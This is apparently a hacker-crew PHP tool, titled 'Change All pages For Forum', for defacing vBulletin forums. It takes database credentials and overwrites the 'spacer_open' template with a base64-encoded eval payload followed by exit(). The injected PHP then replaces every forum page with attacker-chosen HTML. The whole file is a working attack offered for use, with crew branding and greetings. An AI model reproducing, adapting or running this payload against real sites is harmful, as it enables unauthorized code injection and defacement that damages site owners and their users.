<?php
/*
   |.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|
 |.|###################################################|.|
 |.|#                                                 #|.|
 |.|#  <==-|AL-MoGrM|-==> - <==-|t0v@HoTmAiL.CoM-==>  #|.|
 |.|#                                                 #|.|
 |.|###################################################|.|
   |.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|.|
*/

?>
<html><style>
input, select, textarea {
background-color: #000000;
border-style: #7a7c7d;
border-width: 1px;
font-family: verdana, arial, sans-serif;
font-size: 11px;
color: #7a7c7d;
padding: 0px;
}
A:link {
COLOR:#A2A2A2; TEXT-DECORATION: none
}
A:visited {
COLOR:#A2A2A2; TEXT-DECORATION: none
}
A:active {
COLOR:#787878; TEXT-DECORATION: none
}
A:hover {
color:#8C8C8C;TEXT-DECORATION: none
}
</style>
<head>
  <title>Change All pages For Forum</title>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>
       <body bgcolor="black" text="#7a7c7d">
       <div align="center">
      <H2><u>AL-M<strong>0</strong>GrM</u></H2>
|<a href="mailto:t0v@hotmail.com">t0v(AT)HoTmaiL(DoT)CoM</a>| | <a href="http://tryag.com/cc/">WwW.TrYaG.CoM</a> |<br>
<u>Change All pages For Forum</u>
<br><br>
      <?

if(empty($_POST['index'])){
echo "<FORM method=\"POST\">
host : <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\">
database : <INPUT size=\"15\" value=\"forum_vb\" name=\"database\" type=\"text\"><br>
username : <INPUT size=\"15\" value=\"forum_vb\" name=\"username\" type=\"text\">
password : <INPUT size=\"15\" value=\"vb\" name=\"password\" type=\"password\"><br>
      <br>
<textarea name=\"index\" cols=\"70\" rows=\"30\">Set Your Index</textarea><br>
<INPUT value=\"Set\" name=\"send\" type=\"submit\">
</FORM>";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$index     = $_POST['index'];
         @mysql_connect($localhost,$username,$password) or die(mysql_error());
         @mysql_select_db($database) or die(mysql_error());

$index=str_replace("\'","'",$index);

$set_index  = "{\${eval(base64_decode(\'";

$set_index .= base64_encode("echo \"$index\";");


$set_index .= "\'))}}{\${exit()}}</textarea>";

$ok=@mysql_query("UPDATE template SET template ='".$set_index."' WHERE title ='spacer_open'") or die(mysql_error());

if($ok){
echo "!! update finish !!<br><br>";
}

}
# Footer
echo "<strong>SpeciaL GreeTz To :</strong> <u>Mohajer22</u>";
?>

